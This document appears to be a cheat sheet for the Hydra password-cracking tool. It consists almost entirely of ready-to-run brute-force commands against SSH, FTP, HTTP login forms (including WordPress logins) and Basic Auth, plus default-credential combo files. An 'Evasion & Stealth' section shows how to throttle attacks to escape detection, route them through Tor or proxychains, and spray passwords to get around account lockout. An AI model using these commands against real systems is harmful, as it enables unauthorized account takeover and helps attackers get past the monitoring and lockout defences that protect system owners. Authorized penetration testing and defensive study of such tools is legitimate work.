SSH
# Single user, password list
hydra -l admin -P /usr/share/wordlists/rockyou.txt 192.168.1.10 ssh
# Userlist + passlist, low threads (safe)
hydra -L users.txt -P pass.txt -t 4 -f 10.10.10.5 ssh
# Custom port, verbose, stop on first hit
hydra -l root -P rockyou.txt -s 2222 -V -f target.com ssh
# Try null/same-as-login/reversed passwords too
hydra -l admin -P pass.txt -e nsr 10.0.0.1 ssh
HTTP/HTTPS Login Forms
# POST form — syntax: /path:body:fail_string
hydra -l admin -P rockyou.txt 10.10.10.1 http-post-form "/login:user=^USER^&pass=^PASS^:Invalid credentials"
# HTTPS POST form with cookie session
hydra -L users.txt -P pass.txt -S site.com https-post-form "/wp-login.php:log=^USER^&pwd=^PASS^:ERROR"
# With success condition (use :S= prefix instead)
hydra -l admin -P pass.txt 192.168.0.1 http-post-form "/admin/login:username=^USER^&password=^PASS^:S=dashboard"
# HTTP Basic Auth
hydra -l admin -P pass.txt 192.168.1.1 http-get /admin/
# GET form with CSRF (add cookie H= header)
hydra -l admin -P pass.txt target.com http-post-form "/login:user=^USER^&pass=^PASS^:F=wrong:H=Cookie\: session=abc123"
Form string format: /path:POST_BODY:FAIL_STRING
Use F=text for failure string, S=text for success string.
Add H=Header: value to inject custom headers (Cookie, User-Agent, etc.)

Combo File Format (-C flag)
# Format: login:password (one pair per line)
$cat combos.txt

        root:toor

        admin:admin123
hydra -C combos.txt 10.0.0.1 ftp
-e nsr explained: n = try empty password | s = try username as password | r = try reversed username as password. Always include this for quick wins!
SSH thread limit: Keep -t 4 for SSH. Higher thread counts trigger MaxStartups in sshd_config and lock you out. Use -W 1 to add a 1-second delay between attempts to avoid detection.
Session Management
# Restore interrupted session (hydra.restore auto-created)
hydra -R
# Ignore existing restore file and start fresh
hydra -l admin -P pass.txt -I 10.0.0.1 ssh
# Save found credentials to output file
hydra -l admin -P pass.txt -o found_creds.txt 10.0.0.1 ftp
# JSON output format
hydra -l admin -P pass.txt -o out.json -b json 10.0.0.1 ssh
Evasion & Stealth
# Slow attack — 1 connection/thread every 5 seconds
hydra -l admin -P pass.txt -t 1 -W 5 10.0.0.1 ssh
# Route through SOCKS5 proxy (Tor or Proxychains)
proxychains hydra -l admin -P pass.txt 10.0.0.1 ssh
# Loop users first (spray one password across all users)
hydra -L users.txt -p Summer2024! -u 10.0.0.1 ssh
# Set custom timeout (longer = less aggressive)
hydra -l admin -P pass.txt -w 60 -t 2 10.0.0.1 ssh

Password Spray: Use -u with a single password (-p) across many users (-L). Avoids account lockout by trying one pass per user before moving to the next.
Restore session: Hydra auto-creates hydra.restore on interrupt (Ctrl+C). Always run hydra -R to resume without losing progress.
